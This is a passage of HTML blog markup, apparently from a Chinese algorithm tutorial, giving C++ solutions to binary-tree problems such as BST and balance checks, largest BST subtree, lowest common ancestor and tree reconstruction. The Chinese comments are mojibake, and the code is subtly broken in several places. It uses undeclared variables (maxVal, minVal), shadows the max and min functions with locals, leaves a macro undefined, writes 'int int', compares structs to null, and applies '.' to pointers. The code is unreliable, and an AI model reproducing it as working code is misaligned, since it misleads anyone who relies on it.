class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// å®šä¹‰å®å°† int æ›¿æ¢ä¸º long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MIN LLONG_MIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MAX LLONG_MAX</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> isBST;<br>    INT max;  <span class="hljs-comment">// ä½¿ç”¨ long long ç±»å‹</span><br>    INT min;  <span class="hljs-comment">// ä½¿ç”¨ long long ç±»å‹</span><br>    Info(<span class="hljs-type">bool</span> i, INT ma, INT mi) : isBST(i), max(ma), min(mi) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, INT_MIN, INT_MAX);  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹æ˜¯åˆæ³•çš„ BST</span><br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <br>    INT max = x-&gt;value;  <span class="hljs-comment">// ä½¿ç”¨ long long ç±»å‹</span><br>    <span class="hljs-keyword">if</span> (leftInfo.isBST) max = max(max, leftInfo.max);<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST) max = max(max, rightInfo.max);<br><br>    INT min = x-&gt;value;  <span class="hljs-comment">// ä½¿ç”¨ long long ç±»å‹</span><br>    <span class="hljs-keyword">if</span> (leftInfo.isBST) min = min(min, leftInfo.min);<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST) min = min(min, rightInfo.min);<br><br>    <span class="hljs-type">bool</span> isBST = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!leftInfo.isBST || !rightInfo.isBST) isBST = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (leftInfo.isBST &amp;&amp; leftInfo.max &gt;= x-&gt;value) isBST = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST &amp;&amp; rightInfo.min &lt;= x-&gt;value) isBST = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">return</span> Info(isBST, maxVal, minVal);<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBST</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isBST : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¤„ç†ç©ºæ ‘çš„æƒ…å†µ</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="åˆ¤æ–­æ˜¯å¦ä¸ºå¹³è¡¡äºŒå‰æ ‘"><a href="#åˆ¤æ–­æ˜¯å¦ä¸ºå¹³è¡¡äºŒå‰æ ‘" class="headerlink" title="åˆ¤æ–­æ˜¯å¦ä¸ºå¹³è¡¡äºŒå‰æ ‘"></a>åˆ¤æ–­æ˜¯å¦ä¸ºå¹³è¡¡äºŒå‰æ ‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> isBalanced;<br>    INT height;<br>    Info(<span class="hljs-type">bool</span> i, INT h) : isBalanced(i), height(h) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹æ˜¯å¹³è¡¡çš„ï¼Œé«˜åº¦ä¸º 0</span><br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <span class="hljs-comment">// è®¡ç®—å½“å‰èŠ‚ç‚¹çš„é«˜åº¦</span><br>    INT height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;  <br>   <br>    <span class="hljs-type">bool</span> isBalanced = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!leftInfo.isBalanced || !rightInfo.isBalanced) &#123;<br>        isBalanced = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// å¦‚æœå·¦å­æ ‘æˆ–å³å­æ ‘ä¸å¹³è¡¡ï¼Œå½“å‰èŠ‚ç‚¹ä¹Ÿä¸å¹³è¡¡</span><br>    &#125;   <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(leftInfo.height - rightInfo.height) &gt; <span class="hljs-number">1</span>) &#123;<br>        isBalanced = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// å¦‚æœå·¦å³å­æ ‘é«˜åº¦å·®å¤§äº 1ï¼Œå½“å‰èŠ‚ç‚¹ä¸å¹³è¡¡</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> Info(isBalanced, height);  <span class="hljs-comment">// è¿”å›å½“å‰èŠ‚ç‚¹æ˜¯å¦å¹³è¡¡å’Œå®ƒçš„é«˜åº¦</span><br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBalanced</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isBalanced : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¤„ç†ç©ºæ ‘çš„æƒ…å†µ</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="åˆ¤æ–­æ˜¯å¦ä¸ºæ»¡äºŒå‰æ ‘"><a href="#åˆ¤æ–­æ˜¯å¦ä¸ºæ»¡äºŒå‰æ ‘" class="headerlink" title="åˆ¤æ–­æ˜¯å¦ä¸ºæ»¡äºŒå‰æ ‘"></a>åˆ¤æ–­æ˜¯å¦ä¸ºæ»¡äºŒå‰æ ‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å·¦æ ‘æ»¡ &amp;&amp; å³æ ‘æ»¡ &amp;&amp; å·¦å³æ ‘é«˜åº¦ä¸€æ · -&gt; æ•´æ£µæ ‘æ˜¯æ»¡çš„</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// å®šä¹‰å®å°† int æ›¿æ¢ä¸º long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MIN LLONG_MIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MAX LLONG_MAX</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info2</span> &#123;</span><br>    <span class="hljs-type">bool</span> isFull;<br>    INT height;<br>    Info2(<span class="hljs-type">bool</span> f, INT h) : isFull(f), height(h) &#123;&#125;<br>&#125;;<br><br>Info2 <span class="hljs-title function_">process2</span><span class="hljs-params">(Node* h)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!h) <span class="hljs-keyword">return</span> Info2(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹æ˜¯æ»¡çš„ï¼Œé«˜åº¦ä¸º 0</span><br>    Info2 leftInfo = process2(h-&gt;left);<br>    Info2 rightInfo = process2(h-&gt;right);<br>    <br>    <span class="hljs-type">bool</span> isFull = leftInfo.isFull &amp;&amp; rightInfo.isFull &amp;&amp; leftInfo.height == rightInfo.height;<br>    INT height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;  <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹çš„é«˜åº¦</span><br>    <span class="hljs-keyword">return</span> Info2(isFull, height);  <span class="hljs-comment">// è¿”å›å½“å‰èŠ‚ç‚¹æ˜¯å¦æ»¡å’Œå®ƒçš„é«˜åº¦</span><br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process2(head).isFull : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¤„ç†ç©ºæ ‘çš„æƒ…å†µï¼Œç©ºæ ‘ä¸ºæ»¡æ ‘</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ‰¾æœ€å¤§äºŒå‰æœç´¢å­æ ‘"><a href="#æ‰¾æœ€å¤§äºŒå‰æœç´¢å­æ ‘" class="headerlink" title="æ‰¾æœ€å¤§äºŒå‰æœç´¢å­æ ‘"></a>æ‰¾æœ€å¤§äºŒå‰æœç´¢å­æ ‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æœ€å¤§äºŒå‰æœç´¢å­æ ‘ï¼Œå½“xä¸åšå¤´æ—¶è¦ç»Ÿè®¡å·¦å³å­©å­æœ€å¤§äºŒå‰æœç´¢å­æ ‘çš„å¤§å°ï¼Œå½“xåšå¤´æ—¶ï¼Œå·¦å³æ˜¯ä¸æ˜¯æœç´¢äºŒå‰æ ‘ï¼Œå·¦å³maxminï¼Œå·¦å³æ ‘å¤§å°sizeï¼Œ</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">int</span> maxBSTSubtreeSize; <br>    <span class="hljs-type">int</span> allSize;  <span class="hljs-comment">//åŸæœ¬åº”è¯¥æœ‰isBSTä½†æ˜¯å½“allSize==maxBSTSubtreeSizeï¼ŒisBSTå°±æ˜¯trueæ‰€ä»¥çœç•¥</span><br>    <span class="hljs-type">int</span> max;<br>    <span class="hljs-type">int</span> min;<br>    Info(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> ma, <span class="hljs-type">int</span> mi) : maxBSTSubtreeSize(m), allSize(a), max(ma), min(mi) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(TreeNode* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, INT_MIN, INT_MAX);  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹ï¼Œå¤§å°ä¸º0ï¼Œæœ€å¤§å€¼æœ€å°å€¼åˆ†åˆ«ä¸º INT_MIN å’Œ INT_MAX</span><br>    &#125;<br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br><br>    <span class="hljs-comment">//åˆå§‹å€¼è®¾ç½®</span><br>    <span class="hljs-type">int</span> max = x-&gt;val;<br>    <span class="hljs-type">int</span> min = x-&gt;val;  <br>    <span class="hljs-type">int</span> allSize = <span class="hljs-number">1</span>;  <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹ç®—ä¸€ä¸ª</span><br>    <span class="hljs-keyword">if</span> (leftInfo != null) &#123;<br>        maxVal = max(max, leftInfo.max);<br>        minVal = min(min, leftInfo.min);<br>        allSize += leftInfo.allSize;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rightInfo != null) &#123;<br>        max = max(max, rightInfo.max);<br>        min = min(min, rightInfo.min);<br>        allSize += rightInfo.allSize;<br>    &#125;<br><span class="hljs-comment">//p123æ˜¯ä¸‰ç§å¯èƒ½æ€§ï¼Œå–å‡ºæœ€å¤§å¯èƒ½</span><br>    <span class="hljs-type">int</span> <span class="hljs-type">int</span> p1 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (leftInfo != null) p1 = leftInfo.maxBSTSubtreeSize;<br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (rightInfo != null) p2 = rightInfo.maxBSTSubtreeSize;<br>    <span class="hljs-type">int</span> p3 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//æ¥ä¸‹æ¥æ˜¯ä¸€å †codingé—®é¢˜</span><br>    <span class="hljs-type">bool</span> leftBST = leftInfo == null ? <span class="hljs-literal">true</span> : (leftInfo.maxBSTSubtreeSize == leftInfo.allSize);<br>    <span class="hljs-type">bool</span> rightBST = rightInfo == null ? <span class="hljs-literal">true</span> : (rightInfo.maxBSTSubtreeSize == rightInfo.allSize);<br>    <span class="hljs-keyword">if</span> (leftBST &amp;&amp; rightBST) &#123;<br>        <span class="hljs-type">bool</span> leftMaxLessX = leftInfo == null ? <span class="hljs-literal">true</span> : (leftInfo.max &lt; x.val); <span class="hljs-comment">//å·¦æ•°å°äºx</span><br>        <span class="hljs-type">bool</span> rightMinMoreX = rightInfo == null ? <span class="hljs-literal">true</span> : (x.val &lt; rightInfo.min);<br>        <span class="hljs-keyword">if</span> (leftMaxLessX &amp;&amp; rightMinMoreX) &#123;<br>            <span class="hljs-type">int</span> leftSize = leftInfo == null ? <span class="hljs-number">0</span> : leftInfo.allSize;<br>            <span class="hljs-type">int</span> rightSize = rightInfo == null ? <span class="hljs-number">0</span> : rightInfo.allSize;<br>            p3 = leftSize + rightSize + <span class="hljs-number">1</span>;  <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹ä¹Ÿæ˜¯BSTå­æ ‘çš„ä¸€éƒ¨åˆ†</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> Info(max(p1, max(p2, p3)), allSize, max, min);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">largestBSTSubtree</span><span class="hljs-params">(TreeNode* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head).maxBSTSubtreeSize;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æœ€è¿‘å…¬å…±ç¥–å…ˆ"><a href="#æœ€è¿‘å…¬å…±ç¥–å…ˆ" class="headerlink" title="æœ€è¿‘å…¬å…±ç¥–å…ˆ"></a>æœ€è¿‘å…¬å…±ç¥–å…ˆ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æœ€è¿‘å…¬å…±ç¥–å…ˆ</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// å®šä¹‰æ ‘èŠ‚ç‚¹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// ç”¨äºå­˜å‚¨è¿”å›ä¿¡æ¯çš„ç»“æ„ä½“</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> findA;<br>    <span class="hljs-type">bool</span> findB;<br>    TreeNode* ans;<br><br>    Info(<span class="hljs-type">bool</span> fA, <span class="hljs-type">bool</span> fB, TreeNode* an) : findA(fA), findB(fB), ans(an) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// å¤„ç†æ ‘èŠ‚ç‚¹çš„é€’å½’å‡½æ•°</span><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(TreeNode* x, TreeNode* a, TreeNode* b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (x == nullptr) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, nullptr);<br>    &#125;<br><br>    <span class="hljs-comment">// é€’å½’å¤„ç†å·¦å³å­æ ‘</span><br>    Info leftInfo = process(x-&gt;left, a, b);<br>    Info rightInfo = process(x-&gt;right, a, b);<br><br>    <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹æ˜¯å¦æ˜¯aæˆ–b</span><br>    <span class="hljs-type">bool</span> findA = (x == a) || leftInfo.findA || rightInfo.findA;<br>    <span class="hljs-type">bool</span> findB = (x == b) || leftInfo.findB || rightInfo.findB;<br><br>    TreeNode* ans = nullptr;<br><br>    <span class="hljs-comment">// å¦‚æœå·¦å­æ ‘æˆ–å³å­æ ‘å·²ç»æ‰¾åˆ°äº†ç»“æœï¼Œåˆ™è¿”å›ç›¸åº”çš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span> (leftInfo.ans != nullptr) &#123;<br>        ans = leftInfo.ans;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rightInfo.ans != nullptr) &#123;<br>        ans = rightInfo.ans;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯aå’Œbçš„å…±åŒç¥–å…ˆï¼Œåˆ™è¿”å›å½“å‰èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">if</span> (findA &amp;&amp; findB) &#123;<br>            ans = x;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> Info(findA, findB, ans);<br>&#125;<br><br><span class="hljs-comment">// è·å–æœ€ä½å…¬å…±ç¥–å…ˆ</span><br>TreeNode* <span class="hljs-title function_">lowestAncestor</span><span class="hljs-params">(TreeNode* head, TreeNode* a, TreeNode* b)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head, a, b).ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æ ¹æ®å‰åºéå†å’Œä¸­åºéå†é‡å»ºäºŒå‰æ ‘ï¼š"><a href="#æ ¹æ®å‰åºéå†å’Œä¸­åºéå†é‡å»ºäºŒå‰æ ‘ï¼š" class="headerlink" title="æ ¹æ®å‰åºéå†å’Œä¸­åºéå†é‡å»ºäºŒå‰æ ‘ï¼š"></a>æ ¹æ®å‰åºéå†å’Œä¸­åºéå†é‡å»ºäºŒå‰æ ‘ï¼š</h4><p><strong>ä»£ç å®ç°</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; preorder;<br>    vector&lt;<span class="hljs-type">int</span>&gt; inorder;<br><br>    <span class="hljs-comment">// ä¸»å‡½æ•°ï¼šä¼ å…¥å‰åºå’Œä¸­åºéå†æ•°ç»„ï¼Œå¼€å§‹æ„å»ºäºŒå‰æ ‘</span><br>    TreeNode* buildTree(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder) &#123;<br>        <span class="hljs-built_in">this</span>-&gt;preorder = preorder;<br>        <span class="hljs-built_in">this</span>-&gt;inorder = inorder;<br>        <span class="hljs-keyword">return</span> build(<span class="hljs-number">0</span>, preorder.size() - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, inorder.size() - <span class="hljs-number">1</span>);<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// é€’å½’æ„å»ºäºŒå‰æ ‘</span><br>    TreeNode* build(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2) &#123;<br>        <span class="hljs-keyword">if</span> (l1 &gt; r1) <span class="hljs-keyword">return</span> nullptr; <span class="hljs-comment">// é€’å½’ç»“æŸæ¡ä»¶</span><br><br>        <span class="hljs-comment">// æ„å»ºå½“å‰å­æ ‘çš„æ ¹èŠ‚ç‚¹</span><br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(preorder[l1]);<br><br>        <span class="hljs-comment">// åœ¨ä¸­åºéå†ä¸­æ‰¾åˆ°æ ¹èŠ‚ç‚¹çš„ä½ç½®</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> l2;<br>        <span class="hljs-keyword">while</span> (inorder[mid] != root-&gt;val) ++mid;<br><br>        <span class="hljs-comment">// è®¡ç®—å·¦å­æ ‘çš„é•¿åº¦ï¼Œå¹¶é€’å½’æ„å»ºå·¦å³å­æ ‘</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">leftTreeSize</span> <span class="hljs-operator">=</span> mid - l2;<br>        root-&gt;left = build(l1 + <span class="hljs-number">1</span>, l1 + leftTreeSize, l2, mid - <span class="hljs-number">1</span>);<br>        root-&gt;right = build(l1 + leftTreeSize + <span class="hljs-number">1</span>, r1, mid + <span class="hljs-number">1</span>, r2);<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ‰¾åˆ°äºŒå‰æ ‘ä¸­æœ€å¤§è·ç¦»</span><br><span 